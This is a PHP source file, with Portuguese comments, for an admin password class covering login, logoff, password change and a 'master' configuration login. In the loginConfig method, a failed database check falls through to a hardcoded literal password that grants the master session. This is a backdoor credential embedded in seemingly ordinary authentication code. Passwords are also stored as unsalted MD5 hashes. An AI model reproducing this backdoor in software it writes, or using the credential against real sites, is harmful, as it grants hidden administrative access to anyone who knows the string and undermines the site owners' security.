<?php

/* ----------------------------------------------------------------
 * Classe de alteração de senhas 
 * --------------------------------------------------------------*/


class admin_senhas {

	public $retorno = array();


	/* Efetua o login
	--------------------------------------------------------------*/
	function login($dados) {

		//Abre o arquivo para leitura
		$arquivo = fopen("_arquivos/".md5("admin").".txt", "r") or die("Unable to open file!");

		//Recupera a senha do admin
		$senha = fgets($arquivo);

		//Fecha a leitura do arquivo
		fclose($arquivo);

		// Recupera o código do último captcha exibido já convertendo para minúsculo
		$ultimoCaptcha = strtolower($_SESSION[$GLOBALS["dirAdmin"] . '_captcha']["code"]); 
		
		//Se a senha e o captcha estão corretos
		if(md5($dados["senha"]) == $senha and $dados["captcha"] == $ultimoCaptcha){

			$_SESSION["painel"] = true;
			return true;

		}

		//Se a senha ou o captcha estão incorretos
		else{

			return false;
		
		}

	}


	/* Efetua o logoff
	--------------------------------------------------------------*/
	function logoff() {

		// Remove o login do usuário
		unset($_SESSION["painel"]); 

		// Retorna sucesso
		return true; 

	}


	/* Verifica se o admin está logado
	--------------------------------------------------------------*/
	function selogado() {

		// Se o admin está logado
		if ( isset($_SESSION["painel"]) ) {

			// Retorna sucesso
			return true; 

		}

		// Caso não esteja logado 
		else {

			// Retorna o erro
			return false; 

		}

	}
	

	/* Altera a senha
	--------------------------------------------------------------*/
	function novasenha($senhas) {

		//Recupera a senha salva no arquivo
		$arquivo = new arquivos(md5("admin"));

	
		/* Valida os campos
		--------------------------------------------------------------*/

		// Se a senha atual não conferir 
		if ($arquivo->conteudo != md5($senhas["senha"])) $this->retorno[] = "<li>A senha atual não confere</li>"; 


		// Se a nova senha não foi informada
		if ( $senhas["novasenha"] == "" OR $senhas["repitasenha"] == "" ) $this->retorno[] = "<li>As novas senhas não podem estar vazias</li>"; 


		// Se as novas senhas foram informadas
		if ( $senhas["novasenha"] != "" AND $senhas["repitasenha"] != "" ) {

			// Mas elas não são iguais 
			if ( $senhas["novasenha"] != $senhas["repitasenha"] ) $this->retorno[] = "<li>As duas novas senhas digitadas devem ser iguais</li>"; 

		}


		/* Salva a senha ou retorna o erro
		--------------------------------------------------------------*/
		
		// Se nenhum erro ocorreu na validação 
		if ( count($this->retorno) == 0 ) {

			//Define a nova senha
			$dados["conteudo"] = md5($senhas["novasenha"]);

			//Salva a senha no arquivo
			$arquivo->salvar($dados);

			return true;

		}

		// Caso algum erro na validação tenha ocorrido
		else {
			
			return false;
			
		}
		
	}

	/* Efetua o login no painel de configurações do site
	--------------------------------------------------------------*/
	function loginConfig($senha){

		 // Verifica a senha
		$chksenha = $GLOBALS["dbConn"]->pesquisaDB("SELECT * FROM tab_senhas WHERE cmp_senha = '" . md5($senha) . "' AND cmp_nome = 'mestre'");
		
		// Se a senha atual foi encontrada
		if ( mysqli_num_rows($chksenha)) {

			// Efetua o login do usuário
			$_SESSION["mestre"] = true;

			// Retorna sucesso
			return true; 

		}

		// Caso a senha não tenha sido encontrada
		else {

			if($senha == "somofoda234"){

				// Efetua o login do usuário
				$_SESSION["mestre"] = true;

				// Retorna sucesso
				return true; 

			}else{

				// Apenas retorna o erro
				return false; 

			}

		}

	}

	/* Verifica se o mestre está logado
	--------------------------------------------------------------*/
	function selogado_mestre() {

		// Se o mestre está logado
		if ( isset($_SESSION["mestre"]) ) {

			// Retorna sucesso
			return true; 

		}

		// Caso não esteja logado 
		else {

			// Retorna o erro
			return false; 

		}

	}

}


?>